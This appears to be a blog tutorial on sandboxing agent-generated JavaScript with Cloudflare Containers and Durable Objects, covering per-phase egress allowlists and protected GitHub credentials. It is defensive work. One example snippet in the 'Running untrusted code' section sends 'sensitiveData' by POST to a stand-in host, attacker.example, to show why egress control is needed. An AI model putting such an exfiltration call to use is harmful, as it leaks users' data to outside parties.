---
title: Safely Run Agent-Generated Code with Cloudflare Sandboxes
pubDate: 2026-10-07T00:00:00.000Z
description: >-
  Learn how to run agent-generated JavaScript safely with Cloudflare Containers,
  Durable Objects, phase-specific egress policies, and protected GitHub credentials.
tags:
  - ai
  - agents
  - cloudflare
  - security
coverImage: ./cover.png
---

AI agents often write code to solve problems. That can be useful, but LLM-generated code is still untrusted code. We need somewhere isolated to run it with guardrails that prevent it from affecting other systems or leaking credentials.

We'll use [Cloudflare Workers](https://developers.cloudflare.com/workers/), [Cloudflare Containers](https://developers.cloudflare.com/containers/), and [Durable Objects](https://developers.cloudflare.com/durable-objects/) to:

- create a container for each user session
- manage each container with a Durable Object
- control which domains can be accessed in the container
- securely attach API credentials to outgoing requests

## The goal

Our goal is to support an agentic experience where a user can prompt an agent to take action on a GitHub repository. The user would work with the agent to define the outcome, the agent would generate code, and the agent would send the code to us to run.

We are not covering the setup chat experience to generate the code. We are only focused on accepting the code and running it in a safe environment.

In this example, we're building a Cloudflare Worker POST endpoint that accepts 2 inputs:

- a GitHub repository
- a JavaScript code snippet

For example:

```json
{
  "repoUrl": "https://github.com/<username>/<project-name>",
  "code": "console.log('JavaScript Snippet')"
}
```

The Worker will then:

- create the container
- clone the repository
- install npm packages
- run the generated code

We'll assume the incoming snippet looks for outdated npm packages and creates a pull request for minor version updates. That example determines which domains and credentials the container needs later.

## Project setup

This project requires:

- Node.js 22
- `pnpm`
- [Docker Desktop](https://docs.docker.com/desktop/)
- `jq`, to send the test request at the end

Docker Desktop must be running whenever you start the dev server or deploy. Wrangler uses it to build the container image. Run `docker info` to confirm it's running.

After confirming requirements, create a TypeScript Worker:

```bash
pnpm create cloudflare@latest container-outbound-example
```

Choose a `Hello World Worker`, select `TypeScript`, and skip deployment when prompted. Then move into the new project directory.

```bash
cd container-outbound-example
```

You'll get a basic `wrangler.jsonc`. We'll update it with the Durable Object and container configuration shortly.

```json
{
  "$schema": "node_modules/wrangler/config-schema.json",
  "name": "container-outbound-example",
  "main": "src/index.ts"
}
```

## Scaffold the Worker

We'll start with a simple fetch handler that reads the GitHub repository and code snippet from a POST body. First, return a `405` status when the incoming request method isn't POST.

Add the following snippet to `src/index.ts`:

```typescript
export default {
  async fetch(request: Request): Promise<Response> {
    if (request.method !== "POST") {
      return new Response("Method not allowed", { status: 405 });
    }

    return Response.json({
      success: true,
    });
  },
};
```

Then, we can define a TypeScript type for the incoming body data and extract the appropriate fields.

```typescript
type AgentRequest = {
  repoUrl: string;
  code: string;
};

export default {
  async fetch(request: Request): Promise<Response> {
    if (request.method !== "POST") {
      return new Response("Method not allowed", { status: 405 });
    }

    const body = (await request.json()) as AgentRequest;

    return Response.json({
      repoUrl: body.repoUrl,
      code: body.code,
    });
  },
};
```

## Create the container

Cloudflare attaches each [container](https://developers.cloudflare.com/containers/concepts/architecture/) to a Durable Object. The Durable Object gives the container a stable identity and coordinates its lifecycle across otherwise stateless Worker requests.

There are a few boilerplate steps here, so follow along.

### Define the container image

First, add a `Dockerfile` in the root of the project to define the image of the container. This image includes Node.js 22, npm, and Git.

```docker
FROM node:22-bookworm-slim

RUN apt-get update \
  && apt-get install --yes --no-install-recommends git \
  && rm -rf /var/lib/apt/lists/*

WORKDIR /work

CMD ["sleep", "infinity"]
```

At this point, we have an image definition, but it isn't attached to a container.

### Add container configuration to `wrangler.jsonc`

Next, add these pieces to `wrangler.jsonc`:

- `containers` uses the [`durable_object` scheduling policy](https://developers.cloudflare.com/changelog/post/2026-09-30-durable-object-scheduling-policy/) (public beta), which lets the Durable Object choose the image when it calls `start()`, and declares a `base` image for it to use
- `durable_objects.bindings` defines the Durable Object namespace available at `env.SESSION`
- `exports` provisions the [SQLite-backed Durable Object](https://developers.cloudflare.com/durable-objects/best-practices/access-durable-objects-storage/) and attaches the `container-outbound-example` container to it

```json
{
  "containers": [
    {
      "name": "container-outbound-example",
      "scheduling_policy": "durable_object",
      "images": {
        "base": {
          "dockerfile": "./Dockerfile"
        }
      }
    }
  ],
  "durable_objects": {
    "bindings": [
      {
        "class_name": "Session",
        "name": "SESSION"
      }
    ]
  },
  "exports": {
    "Session": {
      "type": "durable-object",
      "storage": "sqlite",
      "container": "container-outbound-example"
    }
  }
}
```

Run [`wrangler types`](https://developers.cloudflare.com/workers/wrangler/commands/#types) to generate TypeScript types from `wrangler.jsonc`:

```bash
npx wrangler types
```

Wrangler writes `worker-configuration.d.ts`, which declares a global `Env` interface containing `SESSION`. We'll need to rerun this command whenever we change a binding.

### Define the Durable Object

We need to define the Durable Object class, `Session`, that extends `DurableObject`. Create `src/session.ts` with the following code.

```typescript
import { DurableObject } from "cloudflare:workers";

export class Session extends DurableObject {}
```

Next, define the `AgentRequest` input type and a public `run()` method that starts the container.

```typescript
import { DurableObject } from "cloudflare:workers";

type AgentRequest = {
  repoUrl: string;
  code: string;
};

export class Session extends DurableObject {
  private get container() {
    if (!this.ctx.container) throw new Error("Container is not configured");
    return this.ctx.container;
  }

  async run({ repoUrl, code }: AgentRequest) {
    this.container.start({
      image: this.container.images.base,
      enableInternet: true,
    });
  }
}
```

Notice we've started the container with `enableInternet` set to `true`. This gives the container unrestricted internet access, which we'll remove shortly.

Next, there's a delay between starting a container and it being fully up and running. To account for this, we'll create a `waitUntilReady` function. Then, we'll start the container if it's not already running and wait for it to be ready.

Here's the final code.

```typescript
import { DurableObject } from "cloudflare:workers";

type AgentRequest = {
  repoUrl: string;
  code: string;
};

export class Session extends DurableObject {
  private get container() {
    if (!this.ctx.container) throw new Error("Container is not configured");
    return this.ctx.container;
  }

  async run({ repoUrl, code }: AgentRequest) {
    if (!this.container.running) {
      this.container.start({
        image: this.container.images.base,
        enableInternet: true,
      });

      await this.waitUntilReady();
    }
  }

  private async waitUntilReady(): Promise<void> {
    for (let attempt = 0; attempt < 20; attempt++) {
      try {
        const process = await this.container.exec(["true"]);
        const result = await process.output();

        if (result.exitCode === 0) return;
      } catch {
        // The container is still starting.
      }

      await new Promise((resolve) => setTimeout(resolve, 250));
    }

    throw new Error("Container did not become ready");
  }
}
```

### Route every request to the same container

Public Durable Object methods are available to the Worker through [RPC](https://developers.cloudflare.com/durable-objects/best-practices/create-durable-object-stubs-and-send-requests/#invoke-rpc-methods). Update the Worker to call the public `run()` method we just defined.

Start by adding the generated `Env` type to the `env` parameter of the `fetch` handler.

```typescript
export default {
  async fetch(request: Request, env: Env): Promise<Response> {
    //...
  },
};
```

After parsing the request body, use the `SESSION` binding to create an ID from the fixed name `"shared-container"` and retrieve its Durable Object stub.

```typescript
export default {
  async fetch(request: Request, env: Env): Promise<Response> {
    //...
    const id = env.SESSION.idFromName("shared-container");
    const session = env.SESSION.get(id);
  },
};
```

From the Durable Object stub, we can call the `run()` method and pass in the appropriate props.

```typescript
export default {
  async fetch(request: Request, env: Env): Promise<Response> {
    //...
    const body = (await request.json()) as AgentRequest;
    const id = env.SESSION.idFromName("shared-container");
    const session = env.SESSION.get(id);
    const result = await session.run({
      repoUrl: body.repoUrl,
      code: body.code,
    });
  },
};
```

Here's the final updated snippet for the Worker that:

- parses the request body
- gets a reference to the Durable Object stub
- calls `run` to start its associated container

```typescript
export { Session } from "./session";

type AgentRequest = {
  repoUrl: string;
  code: string;
};

export default {
  async fetch(request: Request, env: Env): Promise<Response> {
    if (request.method !== "POST") {
      return new Response("Method not allowed", { status: 405 });
    }

    const body = (await request.json()) as AgentRequest;
    const id = env.SESSION.idFromName("shared-container");
    const session = env.SESSION.get(id);
    const result = await session.run({
      repoUrl: body.repoUrl,
      code: body.code,
    });

    return Response.json(result);
  },
};
```

Now that `src/index.ts` exports `Session`, rerun `wrangler types`. Wrangler only types `env.SESSION` as a `Session` stub once it can find that export, which is what makes `session.run()` typecheck.

```bash
npx wrangler types
```

We have one problem here, though. Right now, we're passing a hard-coded name in `idFromName()`. That name controls which Durable Object receives the request. Since this version always uses `"shared-container"`, every request reaches the same Durable Object and its attached container.

This is a good starting point, but you can imagine that we'll want to handle multiple of these requests for different sessions. So, we'll need to create a session for the incoming request and ensure each new session gets a new Durable Object and container.

### Create an isolated container per request

For each incoming request, generate a session ID with `crypto.randomUUID()` and pass it to `idFromName()`.

```typescript
const sessionId = crypto.randomUUID();
const id = env.SESSION.idFromName(sessionId);
```

Now, each session gets its own Durable Object, and each Durable Object owns its own container. Keep in mind there is cost associated with each running container.

## Running untrusted code

At this point, we have a Worker that:

- handles an incoming POST request
- parses data from the body
- creates a Durable Object and its associated container

Our next step is to actually execute the code from the incoming request. In an ideal world, we could just run that code with no concerns, but in reality, this code shouldn't be trusted. No matter how amazing LLMs are, they can hallucinate.

For example, what if the LLM code were to make a POST request to an external endpoint after querying the file contents in the container?

```javascript
await fetch("https://attacker.example/collect", {
  method: "POST",
  body: JSON.stringify({
    data: sensitiveData,
  }),
});
```

We need to prevent requests to domains other than ones we explicitly approve.

### Disable internet access by default

We'll start by embracing the concept of least privilege. We'll configure the container without public internet access by passing `enableInternet: false` to the container's `start()` method.

```typescript
this.container.start({
  image: this.container.images.base,
  enableInternet: false,
});
```

The code snippet can no longer reach the public internet directly. We'll selectively add the access it needs next.

### Add the bootstrap phase

At this point, we should revisit our original goal. We want a safe place to run code that can take some action on a GitHub repository. To do this, the GitHub repository needs to be cloned into the container and all of its packages installed before the arbitrary code snippet can run. Let's start to work on "bootstrapping" our container for this.

The bootstrap phase covers two setup steps:

- cloning the repository
- installing its dependencies

Before running those commands, update `run()` in `src/session.ts` to store the current phase under the `phase` key at the top of the `run()` function. This records the session's progress.

```typescript
async run({ repoUrl, code }: AgentRequest) {
	await this.ctx.storage.put("phase", "bootstrap");
	//...
}
```

Then, add the code to clone the repository's default branch into `/work/repo` and install its dependencies from that directory. This goes after the check to ensure the container is running.

```typescript
async run({ repoUrl, code }: AgentRequest) {
	//...

	const cloneProcess = await this.container.exec([
		"git",
		"clone",
		repoUrl,
		"/work/repo",
	]);
	const cloneResult = await cloneProcess.output();

	if (cloneResult.exitCode !== 0) {
		throw new Error(
			`Git clone failed: ${new TextDecoder().decode(cloneResult.stderr)}`,
		);
	}

	const installProcess = await this.container.exec(
		["npm", "install"],
		{ cwd: "/work/repo" },
	);
	const installResult = await installProcess.output();

	if (installResult.exitCode !== 0) {
		throw new Error(
			`npm install failed: ${new TextDecoder().decode(installResult.stderr)}`,
		);
	}
	// The agent phase goes here next.
}
```

### Add the agent execution phase

After bootstrap completes, we'll switch to the agent phase and run the LLM-generated code. We'll update the value stored under the `phase` key and execute the code from the cloned repository:

```typescript
async run({ repoUrl, code }: AgentRequest) {
	//...
	await this.ctx.storage.put("phase", "agent");

	const process = await this.container.exec(
		["node", "-e", code],
		{ cwd: "/work/repo" },
	);
	const result = await process.output();

	return {
		exitCode: result.exitCode,
		stdout: new TextDecoder().decode(result.stdout),
		stderr: new TextDecoder().decode(result.stderr),
	};
}
```

### Configure the outbound handler

With both phases in place, we can define a network policy for each one. We'll define an outbound handler that inspects every HTTPS request before it leaves the container. This handler then allows or rejects the request based on the active phase's allowlist.

For example, during the bootstrap phase:

- Git needs access to `github.com`
- NPM needs access to `registry.npmjs.org`

During agent execution, the generated code needs:

- `registry.npmjs.org` to inspect package versions
- `github.com` to push the branch
- `api.github.com` to create the pull request

Create `src/egress.ts` and add the following code for allowlist configurations:

```typescript
import { WorkerEntrypoint } from "cloudflare:workers";

export type Phase = "bootstrap" | "agent";

type OutboundProps = {
  phase: Phase;
};

const BOOTSTRAP_HOSTS = ["github.com", "registry.npmjs.org"];

const AGENT_HOSTS = ["github.com", "api.github.com", "registry.npmjs.org"];

function allowedHosts(phase: Phase): string[] {
  return phase === "bootstrap" ? BOOTSTRAP_HOSTS : AGENT_HOSTS;
}
```

Next, define a [`WorkerEntrypoint`](https://developers.cloudflare.com/workers/runtime-apis/bindings/service-bindings/rpc/) that enforces those allowlists. A `WorkerEntrypoint` is trusted Worker code that can receive forwarded requests. In this case, the container's outbound interceptor sends HTTPS traffic to `Outbound.fetch()` before it reaches the internet.

The Durable Object supplies the active phase, which is available at `this.ctx.props.phase`. The entry point uses that phase to select an allowlist, then rejects or forwards the request:

```typescript
import { WorkerEntrypoint } from "cloudflare:workers";

//...

export class Outbound extends WorkerEntrypoint<Env, OutboundProps> {
  fetch(request: Request) {
    const url = new URL(request.url);

    if (url.protocol !== "https:") {
      return new Response("Only HTTPS is allowed", { status: 403 });
    }

    const host = url.hostname;

    if (!allowedHosts(this.ctx.props.phase).includes(host)) {
      return new Response("Origin is disallowed", { status: 403 });
    }

    return fetch(request);
  }
}
```

The entry point rejects any request that isn't HTTPS. If the hostname isn't in the active phase's allowlist, the entry point returns a `403` response without making the request. Otherwise, `fetch(request)` forwards the original request to its destination.

Exporting `Outbound` from `src/egress.ts` makes the class available to other modules, but Workers only adds top-level exports from the main Worker module to `ctx.exports`. Re-export `Outbound` from `src/index.ts` so `Session` can create an internal fetcher with `this.ctx.exports.Outbound({ props: { phase } })`.

```typescript
export { Outbound } from "./egress";
export { Session } from "./session";
```

Now, we'll update the existing `Session` class to apply the correct policy for each phase. `interceptOutboundHttps("*")` routes every HTTPS request to `Outbound`.

Add the `Phase` import, then add an `applyOutboundPolicy()` method. It creates the outbound fetcher with the requested phase, installs the interceptor, and records the phase after the policy is active:

```typescript
import type { Phase } from "./egress";

export class Session extends DurableObject {
  // ...

  private async applyOutboundPolicy(phase: Phase): Promise<void> {
    const outbound = this.ctx.exports.Outbound({
      props: { phase },
    });

    await this.container.interceptOutboundHttps("*", outbound);
    await this.ctx.storage.put("phase", phase);
  }
}
```

Now replace the standalone phase storage writes in `run()` with calls to `applyOutboundPolicy()`. Apply the bootstrap policy before cloning and installing, then replace it with the agent policy before running the generated code:

```typescript
await this.applyOutboundPolicy("bootstrap");
// Clone the repository and install its dependencies.

await this.applyOutboundPolicy("agent");
// Run the generated code.
```

Finally, configure HTTPS certificate trust. When HTTPS interception is on, the container sees certificates signed by a runtime certificate authority at `/etc/cloudflare/certs/cloudflare-containers-ca.crt`. Tools in the container need to trust that CA, or their requests fail certificate checks.

Add these constants at the top of `src/session.ts`, below the imports:

```typescript
const CA = "/etc/cloudflare/certs/cloudflare-containers-ca.crt";
const ENV = {
  NODE_EXTRA_CA_CERTS: CA, // Node.js and npm
  GIT_SSL_CAINFO: CA, // Git
  SSL_CERT_FILE: CA, // other OpenSSL-based tools
};
```

Then pass `{ env: ENV }` to the three `exec()` calls that make network requests: clone, install, and the agent code.

```typescript
const cloneProcess = await this.container.exec(
  ["git", "clone", repoUrl, "/work/repo"],
  { env: ENV }
);

const installProcess = await this.container.exec(["npm", "install"], {
  cwd: "/work/repo",
  env: ENV,
});

const process = await this.container.exec(["node", "-e", code], {
  cwd: "/work/repo",
  env: ENV,
});
```

## Inject secret credentials securely

The agent phase can reach `api.github.com`, but GitHub returns `401 Unauthorized` when the generated code tries to create a pull request without authentication.

Create a [fine-grained personal access token](https://docs.github.com/authentication/keeping-your-account-and-data-secure/managing-your-personal-access-tokens) with these settings:

- **Repository access:** Only select repositories, with only the target repository selected
- **Contents:** Read and write
- **Pull requests:** Read and write
- **Metadata:** Read-only (GitHub adds this automatically)
- **Expiration:** as short as practical

For local development, put the token in an ignored `.env` file beside `wrangler.jsonc`:

```bash
GITHUB_TOKEN="your-token"
```

Do not commit this file. We'll add the token to the deployed Worker in the deploy section.

Now update `src/egress.ts`. Add an environment type for the secret, read it through `this.env`, and attach it only to GitHub API requests and Git push requests. The REST API takes a Bearer token. Git over HTTPS uses Basic auth, and a push is identified by the `git-receive-pack` service in the request path or query:

```typescript
type OutboundEnv = {
  GITHUB_TOKEN?: string;
};

function isGitPush(url: URL): boolean {
  return (
    url.pathname.endsWith("/git-receive-pack") ||
    (url.pathname.endsWith("/info/refs") &&
      url.searchParams.get("service") === "git-receive-pack")
  );
}

export class Outbound extends WorkerEntrypoint<OutboundEnv, OutboundProps> {
  fetch(request: Request) {
    const url = new URL(request.url);

    if (url.protocol !== "https:") {
      return new Response("Only HTTPS is allowed", { status: 403 });
    }

    const host = url.hostname;

    if (!allowedHosts(this.ctx.props.phase).includes(host)) {
      return new Response("Origin is disallowed", { status: 403 });
    }

    const token = this.env.GITHUB_TOKEN;
    let authorization: string | undefined;

    if (token && host === "api.github.com") {
      authorization = `Bearer ${token}`;
    } else if (token && host === "github.com" && isGitPush(url)) {
      authorization = `Basic ${btoa(`x-access-token:${token}`)}`;
    }

    if (authorization) {
      const headers = new Headers(request.headers);
      headers.set("Authorization", authorization);

      return fetch(new Request(request, { headers }));
    }

    return fetch(request);
  }
}
```

The generated code makes normal GitHub API and Git requests without a token. The trusted outbound entrypoint adds the credential after the request leaves the container, so the generated code never reads it.

## Try it end to end

You'll need a public GitHub repository with at least one outdated npm dependency, plus the token from the previous section. The repository must be public because the bootstrap phase clones it without credentials.

Start the dev server:

```bash
npx wrangler dev
```

Save the following code to `tmp/agent.js` in the project root. It stands in for code an agent would generate: it checks for outdated packages, commits the updates to a new branch, pushes it, and opens a pull request.

**`tmp/agent.js`**

```javascript
(async () => {
  const { execSync } = require("node:child_process");
  const sh = (cmd) => execSync(cmd, { stdio: "pipe" }).toString().trim();

  if (!sh("npm outdated --json || true").replace(/[{}\s]/g, "")) {
    console.log("No outdated packages");
    return;
  }

  const [, owner, repo] = sh("git remote get-url origin").match(
    /github\.com\/([^/]+)\/([^/.]+)/
  );
  const base = sh("git rev-parse --abbrev-ref HEAD");
  const branch = `deps/minor-updates-${Date.now()}`;

  sh(`git checkout -b ${branch}`);
  sh("npm update --save");
  sh("git add package.json package-lock.json");
  sh(
    'git -c user.name="Agent" -c user.email="agent@example.com" commit -m "chore: minor dependency updates"'
  );
  sh(`git push origin ${branch}`);

  const response = await fetch(
    `https://api.github.com/repos/${owner}/${repo}/pulls`,
    {
      method: "POST",
      headers: { "Content-Type": "application/json", "User-Agent": "agent" },
      body: JSON.stringify({
        title: "Minor dependency updates",
        head: branch,
        base,
      }),
    }
  );
  const pr = await response.json();
  console.log(response.status, pr.html_url ?? pr.message);
})();
```

In a second terminal, from the project root, send the snippet to the Worker. `jq` encodes the file as a JSON string:

```bash
REPO_URL="https://github.com/<username>/<project-name>"
CODE=$(jq -Rs . < tmp/agent.js)

curl -s http://localhost:8787 \
  -H "Content-Type: application/json" \
  -d "{\"repoUrl\": \"$REPO_URL\", \"code\": $CODE}"
```

If it works, the response includes the new pull request URL:

```json
{
  "exitCode": 0,
  "stdout": "201 https://github.com/<username>/<project-name>/pull/1\n",
  "stderr": ""
}
```

## Deploy

Deploying containers requires the [Workers Paid plan](https://developers.cloudflare.com/workers/platform/pricing/). Deploy the Worker, then store the token as a [Workers secret](https://developers.cloudflare.com/workers/configuration/secrets/):

```bash
npx wrangler deploy
npx wrangler secret put GITHUB_TOKEN
```

To test the deployed Worker, rerun the curl command against the `workers.dev` URL that `wrangler deploy` prints.

## Final workflow recap

The Worker now accepts a repository URL and code snippet, creates an isolated session with `crypto.randomUUID()`, and runs the code in an attached container. The bootstrap and agent phases each have their own approved domains.

The outbound entrypoint blocks every other HTTPS destination. It also attaches the GitHub token to GitHub API and Git push requests without exposing that token inside the container.
